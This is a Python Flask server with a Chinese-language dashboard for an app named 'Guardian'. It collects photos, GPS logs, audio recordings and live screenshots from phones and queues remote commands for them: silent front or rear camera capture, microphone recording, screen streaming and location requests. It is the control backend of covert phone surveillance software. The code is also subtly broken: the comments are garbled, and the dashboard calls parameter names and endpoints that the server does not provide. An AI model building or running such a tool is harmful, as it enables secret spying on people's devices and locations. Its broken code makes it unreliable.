#!/usr/bin/env python3
"""
Guardian App - Full Feature Server
Receive: Images, Location, Audio, Alerts, FCM Registration
Supports: MJPEG Video Streaming + Control Panel + Image/Audio Viewer
"""

from flask import Flask, request, jsonify, send_file, Response, send_from_directory
from flask_cors import CORS
import os
from datetime import datetime
import uuid
import time
import glob
import json

app = Flask(__name__)
CORS(app)

# Config
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
AUDIO_FOLDER = os.path.join(BASE_DIR, 'audio_uploads')
LOCATION_FOLDER = os.path.join(BASE_DIR, 'location_logs')
ALERT_FOLDER = os.path.join(BASE_DIR, 'alert_logs')
SCREEN_FOLDER = os.path.join(BASE_DIR, 'live_screens')

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(AUDIO_FOLDER, exist_ok=True)
os.makedirs(LOCATION_FOLDER, exist_ok=True)
os.makedirs(ALERT_FOLDER, exist_ok=True)
os.makedirs(SCREEN_FOLDER, exist_ok=True)

# Device tracking
device_status = {}
latest_location = {}
command_queue = []
activity_log = []

def add_activity(msg):
    activity_log.insert(0, {'time': datetime.now().strftime('%H:%M:%S'), 'msg': msg})
    if len(activity_log) > 100:
        activity_log.pop()

# ==================== æŽ§åˆ¶é¢æ¿HTML ====================

DASHBOARD_HTML = '''
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Guardian Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); min-height: 100vh; color: #e0e0e0; padding: 15px; }
        h1 { color: #00d4ff; margin-bottom: 15px; font-size: 22px; }
        .stats { display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; }
        .stat-card { background: rgba(0,212,255,0.08); border: 1px solid rgba(0,212,255,0.2); border-radius: 8px; padding: 12px 18px; min-width: 120px; text-align: center; }
        .stat-num { font-size: 24px; font-weight: bold; color: #00d4ff; }
        .stat-label { font-size: 11px; color: #888; margin-top: 3px; }
        .tab-bar { display: flex; gap: 5px; margin-bottom: 15px; }
        .tab { padding: 8px 16px; border-radius: 6px 6px 0 0; cursor: pointer; font-size: 13px; background: rgba(255,255,255,0.05); color: #888; border: 1px solid rgba(255,255,255,0.1); border-bottom: none; }
        .tab.active { background: rgba(0,212,255,0.15); color: #00d4ff; border-color: rgba(0,212,255,0.4); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .map-frame { width: 100%; height: 350px; background: #0a0a1a; border-radius: 8px; border: 1px solid rgba(0,212,255,0.2); }
        .device-list { max-height: 400px; overflow-y: auto; }
        .device-item { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 14px; margin-bottom: 10px; }
        .device-name { font-weight: bold; color: #00d4ff; margin-bottom: 5px; }
        .device-info { font-size: 12px; color: #999; line-height: 1.6; }
        .btn-row { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 10px; }
        .btn { padding: 7px 13px; border: none; border-radius: 6px; cursor: pointer; font-size: 12px; font-weight: 600; transition: all 0.2s; }
        .btn:hover { transform: translateY(-1px); box-shadow: 0 3px 10px rgba(0,212,255,0.3); }
        .btn-cam { background: linear-gradient(135deg,#00b4db,#0083b0); color: white; }
        .btn-loc { background: linear-gradient(135deg,#11998e,#38ef7d); color: white; }
        .btn-rec { background: linear-gradient(135deg,#ee0979,#ff6a00); color: white; }
        .btn-screen { background: linear-gradient(135deg,#8e2de2,#4a00e0); color: white; }
        .btn-shot { background: linear-gradient(135deg,#f093fb,#f5576c); color: white; }
        .btn-alert { background: linear-gradient(135deg,#fc4a1a,#f7b733); color: white; }
        .btn-info { background: linear-gradient(135deg,#434343,#000000); color: white; }
        .btn-stop { background: #444; color: #aaa; }
        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill,minmax(140px,1fr)); gap: 8px; }
        .gallery-item { position: relative; aspect-ratio: 1; border-radius: 8px; overflow: hidden; background: #111; cursor: pointer; }
        .gallery-item img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.3s; }
        .gallery-item:hover img { transform: scale(1.05); }
        .log-area { background: #0a0a1a; border: 1px solid rgba(0,212,255,0.2); border-radius: 8px; padding: 12px; height: 380px; overflow-y: auto; font-family: 'Consolas','Courier New',monospace; font-size: 12px; line-height: 1.6; }
        .log-entry { padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.03); }
        .log-time { color: #666; margin-right: 8px; }
        .log-ok { color: #38ef7d; }
        .log-warn { color: #f7b733; }
        .log-err { color: #fc4a1a; }
        .log-info { color: #00d4ff; }
        .filter-bar { display: flex; gap: 8px; margin-bottom: 12px; align-items: center; flex-wrap: wrap; }
        .filter-bar input,.filter-bar select { padding: 7px 12px; border: 1px solid rgba(0,212,255,0.3); border-radius: 6px; background: rgba(0,0,0,0.3); color: #e0e0e0; font-size: 13px; }
        .filter-bar input:focus,.filter-bar select:focus { outline: none; border-color: #00d4ff; }
        .audio-list { max-height: 380px; overflow-y: auto; }
        .audio-item { display: flex; justify-content: space-between; align-items: center; padding: 10px; background: rgba(255,255,255,0.04); border-radius: 6px; margin-bottom: 6px; }
        audio { width: 100%; height: 36px; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 9999; justify-content: center; align-items: center; }
        .modal.show { display: flex; }
        .modal img { max-width: 95vw; max-height: 95vh; border-radius: 8px; }
        .section-title { color: #00d4ff; font-size: 15px; margin: 12px 0 8px; padding-bottom: 5px; border-bottom: 1px solid rgba(0,212,255,0.2); }
        .live-container { position: relative; width: 100%; background: #000; border-radius: 8px; overflow: hidden; min-height: 300px; }
        .live-img { width: 100%; display: block; }
        .live-overlay { position: absolute; bottom: 0; left: 0; right: 0; padding: 8px 12px; background: linear-gradient(transparent,rgba(0,0,0,0.8)); color: #fff; font-size: 12px; display: flex; justify-content: space-between; }
        .live-dot { width: 8px; height: 8px; background: #f00; border-radius: 50%; display: inline-block; animation: blink 1s infinite; margin-right: 5px; }
        @keyframes blink { 50% { opacity: 0.3; } }
        .cmd-input-group { display: flex; gap: 8px; margin-top: 10px; }
        .cmd-input-group input { flex: 1; padding: 8px 12px; border: 1px solid rgba(0,212,255,0.3); border-radius: 6px; background: rgba(0,0,0,0.3); color: #e0e0e0; font-size: 13px; }
        .cmd-input-group button { padding: 8px 18px; }
    </style>
</head>
<body>
<h1>🛡️ Guardian 控制面板</h1>
<div class="stats">
    <div class="stat-card"><div class="stat-num" id="stat-devices">0</div><div class="stat-label">在线设备</div></div>
    <div class="stat-card"><div class="stat-num" id="stat-images">0</div><div class="stat-label">图片总数</div></div>
    <div class="stat-card"><div class="stat-num" id="stat-audio">0</div><div class="stat-label">音频数量</div></div>
</div>

<div class="tab-bar">
    <div class="tab active" data-tab="control">📱 控制</div>
    <div class="tab" data-tab="gallery">📷 图片</div>
    <div class="tab" data-tab="live">📹 直播</div>
    <div class="tab" data-tab="location">📍 位置</div>
    <div class="tab" data-tab="audio">🎤 录音</div>
</div>

<!-- 控制面板 Tab -->
<div id="tab-control" class="tab-content active">
    <div class="section-title">在线设备</div>
    <div class="device-list" id="deviceList"></div>
    
    <div class="section-title" style="margin-top:16px">自定义指令</div>
    <div class="cmd-input-group">
        <input type="text" id="customCmdInput" placeholder="输入自定义指令代码（如 528）">
        <button class="btn btn-info" id="customCmdBtn">发送</button>
    </div>
</div>

<!-- 图片 Tab -->
<div id="tab-gallery" class="tab-content">
    <div class="filter-bar">
        <input type="text" id="imgSearch" placeholder="搜索设备ID..." style="width:200px">
        <select id="imgSort"><option value="newest">最新优先</option><option value="oldest">最早优先</option></select>
        <span style="color:#888;font-size:12px" id="imgCount"></span>
    </div>
    <div class="gallery-grid" id="galleryGrid"></div>
</div>

<!-- 直播 Tab -->
<div id="tab-live" class="tab-content">
    <div class="filter-bar">
        <select id="liveDeviceSel"><option value="">选择设备...</option></select>
        <button class="btn btn-screen" id="startLiveBtn">开始直播</button>
        <button class="btn btn-stop" id="stopLiveBtn">停止直播</button>
    </div>
    <div class="live-container" id="liveContainer" style="display:none">
        <img class="live-img" id="liveImg" src="">
        <div class="live-overlay"><span><span class="live-dot"></span>LIVE</span><span id="liveFps">-- FPS</span></div>
    </div>
</div>

<!-- 位置 Tab -->
<div id="tab-location" class="tab-content">
    <div class="filter-bar">
        <select id="locDeviceSel"><option value="">选择设备...</option></select>
        <button class="btn btn-loc" id="refreshLocBtn">刷新位置</button>
    </div>
    <iframe class="map-frame" id="mapFrame"></iframe>
</div>

<!-- 录音 Tab -->
<div id="tab-audio" class="tab-content">
    <div class="filter-bar">
        <input type="text" id="audioSearch" placeholder="搜索设备ID..." style="width:200px">
        <span style="color:#888;font-size:12px" id="audioCount"></span>
    </div>
    <div class="audio-list" id="audioList"></div>
</div>

<!-- 图片预览 Modal -->
<div class="modal" id="imgModal" onclick="this.classList.remove('show')">
    <img id="modalImg" src="" alt="preview">
</div>

<script>
const API = '';
let currentDeviceId = null;
let liveInterval = null;
let frameCount = 0;
let liveStartTime = 0;

// Tab switching
document.querySelectorAll('.tab').forEach(t => t.addEventListener('click', function() {
    document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(x => x.classList.remove('active'));
    this.classList.add('active');
    document.getElementById('tab-' + this.dataset.tab).classList.add('active');
    if (this.dataset.tab === 'gallery') loadGallery();
    if (this.dataset.tab === 'location') loadLocations();
    if (this.dataset.tab === 'audio') loadAudio();
}));

// Stats
async function loadStats() {
    try {
        const r = await fetch(API + '/api/stats');
        const d = await r.json();
        el('stat-devices').textContent = d.devices || 0;
        el('stat-images').textContent = d.images || 0;
        el('stat-audio').textContent = d.audio || 0;
    } catch(e) {}
}

// Device list with event delegation for buttons
async function loadDevices() {
    try {
        const r = await fetch(API + '/api/devices');
        const devices = await r.json();
        const list = el('deviceList');
        if (!Object.values(devices).length) { list.innerHTML = '<p style="color:#666;padding:20px;text-align:center">暂无在线设备</p>'; return; }
        
        // Populate device selects
        const liveSel = el('liveDeviceSel'); const locSel = el('locDeviceSel');
        [liveSel, locSel].forEach(sel => { const v = sel.value; sel.innerHTML = '<option value="">选择设备...</option>'; Object.values(devices).forEach(d => { sel.innerHTML += `<option value="${d.device_id}">${d.device_id}</option>`; }); sel.value = v; });
        
        list.innerHTML = Object.values(devices).map(d => `
<div class="device-item" data-did="${d.device_id}">
    <div class="device-name">📱 ${d.device_id} ${d.last_seen ? '<span style="font-size:11px;color:#888;font-weight:normal">' + timeAgo(d.last_seen) + '</span>' : ''}</div>
    <div class="device-info">
        模型: ${d.model || '未知'} | SDK: ${d.sdk || '?'}<br>
        状态: <span style="color:${isOnline(d.last_seen)?'#38ef7d':'#fc4a1a'}">${isOnline(d.last_seen)?'在线':'离线'}</span> |
        IP: ${d.ip || '-'} | 上报: ${d.reports || 0}
    </div>
    <div class="btn-row">
        <button class="btn btn-cam" data-cmd="528" data-did="${d.device_id}">📷 前置拍照</button>
        <button class="btn btn-cam" data-cmd="529" data-did="${d.device_id}">📷 后置拍照</button>
        <button class="btn btn-loc" data-cmd="200" data-did="${d.device_id}">📍 获取位置</button>
        <button class="btn btn-rec" data-cmd="310" data-did="${d.device_id}">🎤 开始录音</button>
        <button class="btn btn-stop" data-cmd="311" data-did="${d.device_id}">⏹ 停止录音</button>
        <button class="btn btn-screen" data-cmd="420" data-did="${d.device_id}">📺 屏幕直播</button>
        <button class="btn btn-stop" data-cmd="421" data-did="${d.device_id}">⏹ 停止直播</button>
        <button class="btn btn-shot" data-cmd="430" data-did="${d.device_id}">🖼 截屏</button>
        <button class="btn btn-alert" data-cmd="600" data-did="${d.device_id}">🔔 警报</button>
        <button class="btn btn-info" data-cmd="700" data-did="${d.device_id}">ℹ 设备信息</button>
    </div>
</div>`).join('');
        
        // Event delegation for device buttons
        list.addEventListener('click', function(e) {
            const btn = e.target.closest('[data-cmd]');
            if (!btn) return;
            sendToDevice(btn.dataset.did, btn.dataset.cmd);
        });
    } catch(e) { console.error(e); }
}

// Event delegation helper already in loadDevices above

function sendToDevice(deviceId, cmd) {
    currentDeviceId = deviceId;
    fetch(API + '/send_command?device_id=' + deviceId + '&command=' + cmd)
        .then(r => r.json()).then(d => {
            showNotify(`✅ 指令已发送: ${cmd} → ${deviceId}`, 'ok');
        }).catch(() => showNotify('❌ 发送失败', 'err'));
}

function showNotify(msg, type) {
    // Simple toast notification
    const t = document.createElement('div');
    t.textContent = msg;
    t.style.cssText = `position:fixed;top:20px;right:20px;padding:10px 20px;border-radius:8px;color:#fff;font-size:13px;z-index:99999;background:${type==='ok'?'#11998e':type==='err'?'#ee0979':'#f7b733'};animation:fadeIn 0.3s`;
    document.body.appendChild(t);
    setTimeout(() => { t.style.opacity = '0'; t.style.transition = 'opacity 0.3s'; setTimeout(() => t.remove(), 300); }, 2500);
}

function isOnline(ts) { if (!ts) return false; return Date.now() - new Date(ts).getTime() < 60000; }
function timeAgo(ts) { if (!ts) return ''; const s = Math.floor((Date.now() - new Date(ts).getTime()) / 1000); if (s < 60) return s + '秒前'; if (s < 3600) return Math.floor(s/60) + '分钟前'; if (s < 86400) return Math.floor(s/3600) + '小时前'; return Math.floor(s/86400) + '天前'; }
function el(id) { return document.getElementById(id); }

// Gallery
async function loadGallery() {
    try {
        const q = el('imgSearch').value;
        const r = await fetch(API + '/api/images?search=' + encodeURIComponent(q));
        const images = await r.json();
        el('imgCount').textContent = '共 ' + images.length + ' 张';
        el('galleryGrid').innerHTML = images.map((img, i) =>
            `<div class="gallery-item" onclick="showImg('${img.url}')"><img src="${img.url}" alt="${i}" loading="lazy"><div style="position:absolute;bottom:0;left:0;right:0;padding:4px 8px;background:rgba(0,0,0,0.6);font-size:10px;color:#ccc">${img.name || ''}</div></div>`
        ).join('');
    } catch(e) {}
}
el('imgSearch').addEventListener('input', debounce(loadGallery, 400));

function showImg(url) { el('modalImg').src = url; el('imgModal').classList.add('show'); }

// Live streaming
el('startLiveBtn').addEventListener('click', () => {
    const did = el('liveDeviceSel').value;
    if (!did) { showNotify('请先选择设备', 'warn'); return; }
    sendToDevice(did, '420');
    el('liveContainer').style.display = 'block';
    startLiveStream(did);
});
el('stopLiveBtn').addEventListener('click', () => {
    const did = el('liveDeviceSel').value;
    if (did) sendToDevice(did, '421');
    stopLiveStream();
});

function startLiveStream(deviceId) {
    stopLiveStream();
    frameCount = 0;
    liveStartTime = Date.now();
    liveInterval = setInterval(() => {
        fetch(API + '/video/' + deviceId + '?' + Date.now())
            .then(r => r.blob())
            .then(blob => {
                const url = URL.createObjectURL(blob);
                el('liveImg').src = url;
                frameCount++;
                const elapsed = (Date.now() - liveStartTime) / 1000;
                el('liveFps').textContent = (frameCount / elapsed).toFixed(1) + ' FPS';
                setTimeout(() => URL.revokeObjectURL(url), 100);
            })
            .catch(() => {});
    }, 150);
}

function stopLiveStream() {
    if (liveInterval) { clearInterval(liveInterval); liveInterval = null; }
    el('liveContainer').style.display = 'none';
}

// Location
async function loadLocations() {
    try {
        const r = await fetch(API + '/api/locations');
        const locs = await r.json();
        if (locs.length > 0) {
            const l = locs[locs.length - 1];
            el('mapFrame').src = 'https://www.openstreetmap.org/export/embed.html?bbox=' + (l.lng-0.01) + ',' + (l.lat-0.01) + ',' + (l.lng+0.01) + ',' + (l.lat+0.01) + '&layer=mapnik&marker=' + l.lat + ',' + l.lng;
        }
    } catch(e) {}
}
el('refreshLocBtn').addEventListener('click', () => {
    const did = el('locDeviceSel').value;
    if (did) sendToDevice(did, '200');
    setTimeout(loadLocations, 2000);
});

// Audio
async function loadAudio() {
    try {
        const q = el('audioSearch').value;
        const r = await fetch(API + '/api/audio?search=' + encodeURIComponent(q));
        const files = await r.json();
        el('audioCount').textContent = '共 ' + files.length + ' 个';
        el('audioList').innerHTML = files.map(f =>
            `<div class="audio-item"><div><strong>${f.name}</strong><br><small>${f.time || ''} | ${(f.size/1024).toFixed(1)}KB</small></div><audio controls src="${f.url}" preload="none"></audio></div>`
        ).join('');
    } catch(e) {}
}
el('audioSearch').addEventListener('input', debounce(loadAudio, 400));

// Custom command
el('customCmdBtn').addEventListener('click', () => {
    const cmd = el('customCmdInput').value.trim();
    const did = currentDeviceId || (document.querySelector('[data-did]') ? document.querySelector('[data-did]').dataset.did : '');
    if (!cmd) { showNotify('请输入指令', 'warn'); return; }
    if (!did) { showNotify('请先从设备列表选择设备', 'warn'); return; }
    sendToDevice(did, cmd);
    el('customCmdInput').value = '';
});

// Utils
function debounce(fn, ms) { let t; return (...args) => { clearTimeout(t); t = setTimeout(() => fn(...args), ms); }; }

// Init & auto-refresh
loadStats(); loadDevices();
setInterval(() => { loadStats(); loadDevices(); }, 5000);
</script>
</body>
</html>
'''

# ==================== è·¯ç”± ====================

@app.route('/')
def index():
    return DASHBOARD_HTML

@app.route('/dashboard')
def dashboard():
    return DASHBOARD_HTML

@app.route('/api/devices')
def api_devices():
    return jsonify(device_status)

@app.route('/api/stats')
def api_stats():
    images = len(glob.glob(os.path.join(UPLOAD_FOLDER, '*.*')))
    audio = len(glob.glob(os.path.join(AUDIO_FOLDER, '*.*')))
    return jsonify({'images': images, 'devices': len(device_status), 'audio': audio})

# ===== å›¾ç‰‡API =====
@app.route('/api/images')
def api_images():
    files = glob.glob(os.path.join(UPLOAD_FOLDER, '*.*'))
    result = []
    for f in sorted(files, key=os.path.getmtime):
        result.append({
            'filename': os.path.basename(f),
            'size': os.path.getsize(f),
            'time': datetime.fromtimestamp(os.path.getmtime(f)).strftime('%H:%M:%S')
        })
    return jsonify({'images': result})

@app.route('/images/<filename>')
def serve_image(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

# ===== ä½ç½®API =====
@app.route('/api/latest_location')
def api_latest_location():
    return jsonify(latest_location)

# ===== å½•éŸ³API =====
@app.route('/api/audio_list')
def api_audio_list():
    files = glob.glob(os.path.join(AUDIO_FOLDER, '*.*'))
    result = []
    for f in sorted(files, key=os.path.getmtime):
        result.append({
            'filename': os.path.basename(f),
            'size': os.path.getsize(f),
            'time': datetime.fromtimestamp(os.path.getmtime(f)).strftime('%H:%M:%S')
        })
    return jsonify({'audio': result})

@app.route('/audio/<filename>')
def serve_audio(filename):
    return send_from_directory(AUDIO_FOLDER, filename)

# ===== å±å¹•ç›´æ’­API =====
@app.route('/api/latest_screenshot')
def api_latest_screenshot():
    device_id = request.args.get('device_id', None)
    files = glob.glob(os.path.join(SCREEN_FOLDER, '*.jpg'))
    if not files:
        return jsonify({'status': 'no_screenshot'}), 404
    latest = max(files, key=os.path.getmtime)
    return send_file(latest, mimetype='image/jpeg')

@app.route('/video/<device_id>')
def video_stream(device_id):
    """MJPEGè§†é¢‘æµ"""
    def generate():
        while True:
            files = glob.glob(os.path.join(SCREEN_FOLDER, f'{device_id}_*.jpg'))
            if files:
                latest = max(files, key=os.path.getmtime)
                with open(latest, 'rb') as f:
                    frame = f.read()
                yield b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + frame + b'\r\n'
            time.sleep(0.1)
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/video/stream')
def video_stream_any():
    """MJPEGè§†é¢‘æµ(ä»»æ„è®¾å¤‡)"""
    def generate():
        while True:
            files = glob.glob(os.path.join(SCREEN_FOLDER, '*.jpg'))
            if files:
                latest = max(files, key=os.path.getmtime)
                # åªå‘é€5ç§’å†…çš„æˆªå›¾
                if time.time() - os.path.getmtime(latest) < 5:
                    with open(latest, 'rb') as f:
                        frame = f.read()
                    yield b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + frame + b'\r\n'
            time.sleep(0.1)
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

# ===== æˆªå›¾ä¸Šä¼  =====
@app.route('/screenshot', methods=['POST'])
def upload_screenshot():
    device_id = request.args.get('device_id', request.headers.get('Device-ID', 'unknown'))
    try:
        file = request.files.get('file')
        if file:
            filename = f"{device_id}_{int(time.time())}.jpg"
            filepath = os.path.join(SCREEN_FOLDER, filename)
            file.save(filepath)
            # æ¸…ç†æ—§æˆªå›¾ï¼ˆåªä¿ç•™æœ€æ–°20å¼ ï¼‰
            files = sorted(glob.glob(os.path.join(SCREEN_FOLDER, f'{device_id}_*.jpg')), key=os.path.getmtime)
            for old in files[:-20]:
                os.remove(old)
            add_activity(f'æˆªå±ä¸Šä¼ : {device_id[:8]}')
            return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400
    return jsonify({'status': 'error'}), 400

# ==================== åŽŸæœ‰APIè·¯ç”± ====================

@app.route('/upload', methods=['POST'])
def upload_image():
    device_id = request.args.get('device_id', request.headers.get('Device-ID', 'unknown'))
    try:
        file = request.files.get('file')
        if file:
            filename = f"{device_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}.jpg"
            filepath = os.path.join(UPLOAD_FOLDER, filename)
            file.save(filepath)
            device_status[device_id] = {'last_seen': time.time(), 'device_id': device_id, 'last_location': latest_location.get(device_id, {}).get('lat', '')}
            add_activity(f'å›¾ç‰‡ä¸Šä¼ : {device_id[:8]} ({os.path.getsize(filepath)//1024}KB)')
            return jsonify({'status': 'ok', 'file': filename})
        # æ”¯æŒåŽŸå§‹äºŒè¿›åˆ¶ä¸Šä¼  (application/octet-stream)
        raw_data = request.get_data()
        if raw_data and len(raw_data) > 0:
            filename = f"{device_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}.jpg"
            filepath = os.path.join(UPLOAD_FOLDER, filename)
            with open(filepath, 'wb') as f:
                f.write(raw_data)
            device_status[device_id] = {'last_seen': time.time(), 'device_id': device_id, 'last_location': latest_location.get(device_id, {}).get('lat', '')}
            add_activity(f'å›¾ç‰‡ä¸Šä¼ : {device_id[:8]} ({os.path.getsize(filepath)//1024}KB)')
            return jsonify({'status': 'ok', 'file': filename})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400
    return jsonify({'status': 'error', 'message': 'No file'}), 400

@app.route('/location', methods=['POST', 'GET'])
def receive_location():
    device_id = request.args.get('device_id', request.headers.get('Device-ID', 'unknown'))
    lat = request.args.get('lat', '0')
    lng = request.args.get('lng', '0')
    accuracy = request.args.get('accuracy', '0')
    try:
        log = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {device_id} | Lat: {lat}, Lng: {lng}, Acc: {accuracy}m"
        filepath = os.path.join(LOCATION_FOLDER, f'{device_id}.txt')
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write(log + '\n')
        latest_location[device_id] = {'lat': lat, 'lng': lng, 'time': time.time()}
        device_status[device_id] = {'last_seen': time.time(), 'device_id': device_id, 'last_location': f'{lat},{lng}'}
        add_activity(f'ä½ç½®æ›´æ–°: {device_id[:8]} ({lat}, {lng})')
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400

@app.route('/upload_audio', methods=['POST'])
@app.route('/audio_upload', methods=['POST'])  # å…¼å®¹æ‰‹æœºç«¯ä¸¤ç§URL
def upload_audio():
    device_id = request.headers.get('Device-ID', request.args.get('device_id', 'unknown'))
    filename = request.headers.get('File-Name', f'audio_{datetime.now().strftime("%Y%m%d_%H%M%S")}.3gp')
    try:
        file = request.files.get('file')
        if file:
            filepath = os.path.join(AUDIO_FOLDER, f"{device_id}_{filename}")
            file.save(filepath)
            add_activity(f'å½•éŸ³ä¸Šä¼ : {device_id[:8]} ({os.path.getsize(filepath)//1024}KB)')
            return jsonify({'status': 'ok'})
        # æ”¯æŒåŽŸå§‹äºŒè¿›åˆ¶ä¸Šä¼ 
        raw_data = request.get_data()
        if raw_data and len(raw_data) > 0:
            filepath = os.path.join(AUDIO_FOLDER, f"{device_id}_{filename}")
            with open(filepath, 'wb') as f:
                f.write(raw_data)
            add_activity(f'å½•éŸ³ä¸Šä¼ : {device_id[:8]} ({os.path.getsize(filepath)//1024}KB)')
            return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400
    return jsonify({'status': 'error'}), 400

@app.route('/alert', methods=['POST', 'GET'])
def receive_alert():
    device_id = request.args.get('device_id', request.headers.get('Device-ID', 'unknown'))
    alert_type = request.args.get('type', 'UNKNOWN')
    package = request.args.get('package', '')
    try:
        log = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {device_id} | {alert_type}: {package}"
        filepath = os.path.join(ALERT_FOLDER, f'{device_id}_alerts.txt')
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write(log + '\n')
        add_activity(f'è­¦æŠ¥: {device_id[:8]} {alert_type} {package}')
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400

@app.route('/send_command', methods=['GET', 'POST'])
def send_command():
    cmd = request.args.get('cmd', '')
    device_id = request.args.get('device_id', None)
    if not cmd:
        return jsonify({'status': 'error', 'message': 'No command'}), 400
    entry = {'cmd': cmd, 'device_id': device_id, 'time': time.time()}
    command_queue.append(entry)
    add_activity(f'æŒ‡ä»¤å‘é€: {cmd} â†’ {device_id or "æ‰€æœ‰è®¾å¤‡"}')
    return jsonify({'status': 'ok', 'cmd': cmd, 'queued': len(command_queue)})

@app.route('/inbox', methods=['GET'])
def inbox():
    device_id = request.args.get('device_id', request.headers.get('Device-ID', None))
    pending = []
    remaining = []
    for cmd in command_queue:
        if cmd['device_id'] is None or cmd['device_id'] == device_id:
            pending.append(cmd)
        else:
            remaining.append(cmd)
    command_queue.clear()
    command_queue.extend(remaining)
    return jsonify({'commands': pending})

@app.route('/get_command', methods=['GET'])
def get_command():
    """å…¼å®¹Appç«¯è½®è¯¢æ ¼å¼"""
    device_id = request.args.get('device_id', 'unknown')
    last_id = request.args.get('last_id', '0')
    pending = []
    remaining = []
    for i, cmd in enumerate(command_queue):
        if cmd['device_id'] is None or cmd['device_id'] == device_id:
            pending.append((i + 1, cmd['cmd']))
        else:
            remaining.append(cmd)
    command_queue.clear()
    command_queue.extend(remaining)
    if pending:
        # è¿”å›žæ ¼å¼: id|command
        results = [f"{pid}|{pcmd}" for pid, pcmd in pending]
        return '\n'.join(results)
    return 'no_command'

@app.route('/api/activity')
def api_activity():
    return jsonify({'logs': activity_log})

if __name__ == '__main__':
    print("=" * 50)
    print("Guardian App Server Starting...")
    print("Control Panel: http://localhost:5000/dashboard")
    print("Image Gallery: http://localhost:5000/dashboard (å›¾ç‰‡Tab)")
    print("Live View: http://localhost:5000/dashboard (ç›´æ’­Tab)")
    print("=" * 50)
    app.run(host='0.0.0.0', port=5000, debug=False)


